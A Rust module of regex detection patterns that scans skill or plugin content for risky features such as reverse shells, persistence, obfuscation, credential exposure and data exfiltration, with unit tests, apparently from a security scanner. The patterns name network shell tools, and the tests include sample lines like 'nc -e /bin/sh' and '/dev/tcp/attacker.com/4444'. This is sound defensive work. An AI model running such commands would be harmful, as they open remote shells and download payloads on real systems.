//! Shared regex patterns for skill safety analysis.
//!
//! This module consolidates all pre-compiled regex patterns used for
//! extracting safety-relevant features from skill content.

use regex::Regex;
use std::sync::LazyLock;

// ---------------------------------------------------------------------------
// Skill Safety Patterns
// ---------------------------------------------------------------------------

/// Shell execution patterns
pub static SHELL_EXEC_RE: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    vec![
        Regex::new(r"\bexec\s*\(").unwrap(),
        Regex::new(r"\bspawn\s*\(").unwrap(),
        Regex::new(r"\bsystem\s*\(").unwrap(),
        Regex::new(r"child_process").unwrap(),
        Regex::new(r"subprocess\.(run|call|Popen|check_output)").unwrap(),
        Regex::new(r"os\.system\s*\(").unwrap(),
        Regex::new(r"\beval\s*\(\s*`").unwrap(),
        // PowerShell
        Regex::new(r"(?i)Invoke-Expression").unwrap(),
        Regex::new(r"(?i)-EncodedCommand").unwrap(),
        // Rust shell exec
        Regex::new(r"std::process::Command").unwrap(),
        Regex::new(r"Command::new\s*\(").unwrap(),
        // Go shell exec
        Regex::new(r"os/exec").unwrap(),
        Regex::new(r"exec\.Command\s*\(").unwrap(),
    ]
});

/// Network call patterns
pub static NETWORK_CALL_RE: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    vec![
        Regex::new(r"\bfetch\s*\(").unwrap(),
        Regex::new(r"\bcurl\b").unwrap(),
        Regex::new(r"\bwget\b").unwrap(),
        Regex::new(r"\baxios").unwrap(),
        Regex::new(r"\brequests?\.(get|post|put|delete)\b").unwrap(),
        Regex::new(r"\bhttp\.request").unwrap(),
        Regex::new(r"XMLHttpRequest").unwrap(),
        Regex::new(r#"\.open\s*\(\s*['"]https?:"#).unwrap(),
        Regex::new(r"urllib").unwrap(),
        // PowerShell
        Regex::new(r"(?i)Invoke-WebRequest").unwrap(),
        Regex::new(r"(?i)Invoke-RestMethod").unwrap(),
    ]
});

/// File system write patterns
pub static FS_WRITE_RE: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    vec![
        Regex::new(r"writeFile(Sync)?\s*\(").unwrap(),
        Regex::new(r"\b>\s+[/~]").unwrap(),
        Regex::new(r"\b>>\s+").unwrap(),
        Regex::new(r#"open\s*\([^)]*['"][wa]['"]"#).unwrap(),
        Regex::new(r"fs\.(write|append)").unwrap(),
    ]
});

/// Environment access patterns
pub static ENV_ACCESS_RE: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    vec![
        Regex::new(r"process\.env\b").unwrap(),
        Regex::new(r"\.env\b").unwrap(),
        Regex::new(r"os\.environ").unwrap(),
        Regex::new(r"\$\{?[A-Z_]+\}?").unwrap(),
        Regex::new(r"\bdotenv\b").unwrap(),
        Regex::new(r"\bgetenv\b").unwrap(),
    ]
});

/// Credential patterns
pub static CREDENTIAL_RE: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    vec![
        Regex::new(r"(?i)api[_-]?key").unwrap(),
        Regex::new(r"(?i)\bpassword\b").unwrap(),
        Regex::new(r"(?i)\bsecret\b").unwrap(),
        Regex::new(r"(?i)\btoken\b").unwrap(),
        Regex::new(r"(?i)credit[_-]?card").unwrap(),
        Regex::new(r"(?i)private[_-]?key").unwrap(),
        Regex::new(r"(?i)auth[_-]?(token|key|secret)").unwrap(),
        Regex::new(r"Bearer\s+").unwrap(),
    ]
});

/// Reverse shell patterns
pub static REVERSE_SHELL_RE: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    vec![
        Regex::new(r"nc\s+(-e|-c|--exec)").unwrap(),
        Regex::new(r"\bncat\s+").unwrap(),
        Regex::new(r"bash\s+-i\s+>&?\s*/dev/tcp").unwrap(),
        Regex::new(r"/dev/tcp/").unwrap(),
        Regex::new(r"\bmkfifo\b").unwrap(),
        Regex::new(r"\bsocat\b").unwrap(),
        Regex::new(r"(?s)python.*?socket.*?connect").unwrap(),
        Regex::new(r"(?s)perl.*?socket.*?INET").unwrap(),
    ]
});

/// Persistence patterns
pub static PERSISTENCE_RE: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    vec![
        Regex::new(r"\bcrontab\b").unwrap(),
        Regex::new(r"\bcron\b").unwrap(),
        Regex::new(r"\blaunchd\b").unwrap(),
        Regex::new(r"systemctl\s+(enable|start)").unwrap(),
        Regex::new(r"@reboot").unwrap(),
        Regex::new(r"\bschtasks\b").unwrap(),
        Regex::new(r"Register-ScheduledTask").unwrap(),
        Regex::new(r"\.bashrc").unwrap(),
        Regex::new(r"\.profile").unwrap(),
        Regex::new(r"\.zshrc").unwrap(),
        Regex::new(r"\bautostart\b").unwrap(),
    ]
});

/// Obfuscation patterns
pub static OBFUSCATION_RE: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    vec![
        Regex::new(r"\batob\s*\(").unwrap(),
        Regex::new(r#"Buffer\.from\s*\([^)]*,\s*['"]base64"#).unwrap(),
        Regex::new(r"base64\.(b64decode|decodebytes)").unwrap(),
        Regex::new(r"\beval\s*\(").unwrap(),
        Regex::new(r"new\s+Function\s*\(").unwrap(),
        Regex::new(r#"require\s*\(\s*[^'"]"#).unwrap(),
        Regex::new(r"importlib\.import_module").unwrap(),
        Regex::new(r"__import__").unwrap(),
        // Multi-stage payloads
        Regex::new(r"document\.write\s*\(").unwrap(),
        Regex::new(r"\.innerHTML\s*=").unwrap(),
        // Template literal eval
        Regex::new(r"\beval\s*\(\s*`").unwrap(),
        // Unicode obfuscation: zero-width characters
        Regex::new(r"[\u{200B}\u{200C}\u{200D}\u{FEFF}]").unwrap(),
    ]
});

/// Data exfiltration patterns
pub static EXFILTRATION_RE: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    vec![
        Regex::new(r#"\.(post|put)\s*\(\s*['"]https?://"#).unwrap(),
        Regex::new(r#"(?s)fetch\s*\(\s*['"]https?://[^'"]*['"],\s*\{[^}]*?method:\s*['"]POST"#)
            .unwrap(),
        Regex::new(r"(?i)\bwebhook\b").unwrap(),
        Regex::new(r"curl\s+(-X\s+POST|--data)").unwrap(),
    ]
});

/// LLM secret exposure patterns (in SKILL.md instructions)
pub static LLM_SECRET_EXPOSURE_RE: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    vec![
        Regex::new(r"(?i)pass.*(api[_-]?key|password|token|secret|credential)").unwrap(),
        Regex::new(r"(?i)include.*(key|password|token|secret)\s*(in|with|as)").unwrap(),
        Regex::new(r"(?i)send.*(key|password|token|secret)").unwrap(),
        Regex::new(r"(?i)output.*(credential|password|api[_-]?key)").unwrap(),
        Regex::new(r"(?i)print.*(password|secret|token|key)").unwrap(),
        Regex::new(r"(?i)context[_-]?window.*(secret|key|password|token)").unwrap(),
    ]
});

/// External download patterns
pub static EXTERNAL_DOWNLOAD_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)https?://.*\.(exe|msi|dmg|zip|tar|sh|bin|deb|rpm)\b").unwrap()
});

pub static CURL_DOWNLOAD_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)curl.*-[oO]|wget.*-O").unwrap());

/// Privilege escalation patterns
pub static PRIV_ESC_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)\bsudo\b|chmod\s+(\+x|777|755)|chown\s+root").unwrap());

/// Dependency patterns
pub static NPM_INSTALL_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"npm\s+install\s+").unwrap());

pub static PIP_INSTALL_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"pip\s+install\s+").unwrap());

pub static CARGO_ADD_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"cargo\s+add\s+").unwrap());

pub static REQUIRE_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"require\s*\(\s*['"][^./]"#).unwrap());

pub static IMPORT_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"from\s+\S+\s+import|import\s+\S+").unwrap());

/// Password-protected archive patterns
pub static ARCHIVE_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)\.(zip|rar|7z)\b").unwrap());

// ---------------------------------------------------------------------------
// Helper functions
// ---------------------------------------------------------------------------

/// Count the number of matches across a list of patterns
pub fn count_matches(text: &str, patterns: &[Regex]) -> u32 {
    patterns
        .iter()
        .map(|re| re.find_iter(text).count() as u32)
        .sum()
}

/// Check if any pattern matches
pub fn any_match(text: &str, patterns: &[Regex]) -> bool {
    patterns.iter().any(|re| re.is_match(text))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_count_matches() {
        let text = "process.env.SECRET and os.environ['KEY'] and .env file";
        let count = count_matches(text, &ENV_ACCESS_RE);
        assert!(count >= 3, "Should find at least 3 env access patterns");
    }

    #[test]
    fn test_any_match() {
        assert!(any_match("nc -e /bin/sh", &REVERSE_SHELL_RE));
        assert!(any_match("/dev/tcp/attacker.com/4444", &REVERSE_SHELL_RE));
        assert!(!any_match("normal command", &REVERSE_SHELL_RE));
    }

    #[test]
    fn test_powershell_patterns() {
        let text = "Invoke-Expression $payload";
        assert!(count_matches(text, &SHELL_EXEC_RE) > 0);

        let text = "powershell -EncodedCommand ZQBj...";
        assert!(count_matches(text, &SHELL_EXEC_RE) > 0);

        let text = "Invoke-WebRequest https://evil.com/payload";
        assert!(count_matches(text, &NETWORK_CALL_RE) > 0);
    }

    #[test]
    fn test_rust_go_shell_exec_patterns() {
        assert!(count_matches("std::process::Command::new(\"sh\")", &SHELL_EXEC_RE) > 0);
        assert!(count_matches("Command::new(\"bash\")", &SHELL_EXEC_RE) > 0);
        assert!(count_matches("exec.Command(\"sh\")", &SHELL_EXEC_RE) > 0);
    }

    #[test]
    fn test_multi_stage_payload_patterns() {
        assert!(count_matches("document.write('<script>evil()</script>')", &OBFUSCATION_RE) > 0);
        assert!(count_matches("el.innerHTML = payload", &OBFUSCATION_RE) > 0);
    }
}
